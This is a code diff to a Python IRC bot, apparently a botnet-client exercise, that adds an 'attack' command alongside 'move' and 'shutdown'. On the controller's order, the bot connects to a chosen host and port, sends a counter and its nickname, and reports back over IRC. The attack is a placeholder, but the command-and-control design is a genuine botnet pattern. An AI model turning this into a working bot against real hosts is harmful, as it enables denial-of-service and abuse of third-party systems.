@@ -27,6 +27,8 @@ class Bot:
         self._secret = secret
         self._shutdown = False
 
+        self._attackcount = 0
+
         self._trigger = "where mah boyz at?"
         
         self.pickNewName()
@@ -197,29 +199,65 @@ class Bot:
                 
                 print("Controller requested we run command: {0}".format(command))
                 if command == "attack":
-                    pass
-                elif command == "move":
                     eprint(msgParts)
-                    if len(msgParts) == 5:
-                        server = msgParts[2]
-                        channel = msgParts[4]
+                    eprint("Recv attack command")
+                    eprint(len(msgParts))
+                    eprint(msgParts)
+                    if len(msgParts) == 4:
+                        unres_host = msgParts[2]
                         try:
                             port = int(msgParts[3])
                             if port >= 1 and port <= 65535:
-                                #handle server name resolution
-                                self._server = self.domain_resolution(server)
-                                self._port = port
-                                self._channel = '#'+channel
-                                self._socket.send("QUIT\r\n".encode("utf-8"))
+                                host = self.domain_resolution(unres_host)
+                                self.performAttack(host, port, sender)
                             else:
-                                eprint("Ignoring move command. Port not between 1 and 65535.")
+                                eprint("Ignoring attack command. Port not between 1 and 65535.")
                         except:
                             eprint(traceback.format_exc())
-                            eprint("Ignoring move command. Port malformed.")
-                elif command == "shutdown":
-                    self._shutdown = True
+                            eprint("Something went wrong. Ignoring attack command")
+                    else:
+                        eprint("Ignoring attack command. Wrong formatting.")
+            elif command == "move":
+                if len(msgParts) == 5:
+                    server = msgParts[2]
+                    channel = msgParts[4]
+                    try:
+                        port = int(msgParts[3])
+                        if port >= 1 and port <= 65535:
+                            #handle server name resolution
+                            self._server = self.domain_resolution(server)
+                            self._port = port
+                            self._channel = '#'+channel
+                            self._socket.send("QUIT\r\n".encode("utf-8"))
+                        else:
+                            eprint("Ignoring move command. Port not between 1 and 65535.")
+                    except:
+                        eprint(traceback.format_exc())
+                        eprint("Ignoring move command. Port malformed.")   
+            elif command == "shutdown":
+                self._shutdown = True
 
-        
+
+    def performAttack(self, host, port, sender):
+        atksock = socket.socket()
+        self._attackcount = self._attackcount+1
+        try:
+            atksock.connect((host,port))
+            msg = "{0} {1}\n".format(self._attackcount, self._nick).encode("utf-8")
+            totalsent = 0
+            while totalsent < len(msg):
+                sent = atksock.send(msg[totalsent:])
+                if sent == 0:
+                    raise RuntimeError("attack socket connection broken")
+                totalsent = totalsent + sent
+            atksock.close()
+            response = "PRIVMSG {0} :{1}\r\n".format(sender, "attack successful").encode('utf-8')
+            self.logSend(response)
+        except:
+            eprint(traceback.format_exc())
+            eprint("Something went wrong. Attack was unsuccessful")
+            response = "PRIVMSG {0} :{1}\r\n".format(sender, "attack failed, no such hostname").encode('utf-8')
+            self.logSend(response)
             
     def pickNewName(self):
         """ 
@@ -260,8 +298,7 @@ class Bot:
                 eprint("Cannot resolve IP")
         else:
             # else host is an IP
-            host_ip = host
-        eprint("Resolved: ")    
+            host_ip = host    
         return host_ip
 
 
